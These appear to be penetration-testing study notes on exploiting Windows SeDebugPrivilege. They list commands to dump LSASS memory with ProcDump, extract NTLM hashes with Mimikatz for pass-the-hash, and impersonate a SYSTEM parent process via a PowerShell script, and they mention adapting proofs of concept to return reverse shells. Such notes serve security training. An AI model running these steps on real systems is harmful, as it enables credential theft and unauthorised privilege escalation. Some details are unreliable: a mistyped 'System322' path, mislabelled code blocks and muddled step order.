- Used to run a particular application or service or assist with troubleshooting, a user might be assigned SeDebugPrivilege instead of adding the account to the administrators group.
- Usually assigned to Administrators only
- Is given out sparingly because any account that is assigned it will have access to critical os components.

- After logging on as a user assigned the `Debug programs` right and opening an elevated shell, we see `SeDebugPrivilege` is listed.
```python
whoami /priv
#lists out our privileges and SeDebugPrivilege will show up if we have it
```

We can use [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) from the [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)) process, which stores user credentials after a user logs on to a system.
```python
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
- **If this is successfull**:
	- Load this in `Mimikatz` using the `sekurlsa::minidump` command after issuig the `sekurlsa::logonPasswords` commands, we gain the NTLM hash for the local admin account logged on locally.
	- Then we can use it to perform `pass-the-hash` attacks to move laterally if the same local administrator passwd is used on one or multiple additional systems.
> Note: It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

```python
mimikatz.exe
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

```

### Remote Code Execution as SYSTEM
- We can elevate our privileges to SYSTEM
- **Steps:
	- Launch a child process
	- Using the elevated rights granted to our account via SeDebugPrivilege to alter normal system behaviour to inherit the token of a parent process and impersonate it.
	- If we target a parent process running as SYSTEM (specifying the Process ID (or PID)) then we can elevate our rights quickly.
- First, transfer we need to upload this script to our target system: [script](https://github.com/decoder-it/psgetsystem)
```python
.\psgetsys.ps1; [MyProcess]::CreateProcessFromParent (<Pid of target>,"c:\Windows\System322\cmd.exe", "")
```
**PID 612 is SYSTEM**
```python
PS> . .\psgetsys.ps1 

PS> ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
#command from updated script the script link above is the correct link for the script
```

- We could also use the [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) cmdlet to grab the PID of a well-known process that runs as SYSTEM (such as LSASS) and pass the PID directly to the script, cutting down on the number of steps required.
- Other tools such as [this one](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) exist to pop a SYSTEM shell when we have `SeDebugPrivilege`. Often we will not have RDP access to a host, so we'll have to modify our PoCs to either return a reverse shell to our attack host as SYSTEM or another command, such as adding an admin user.
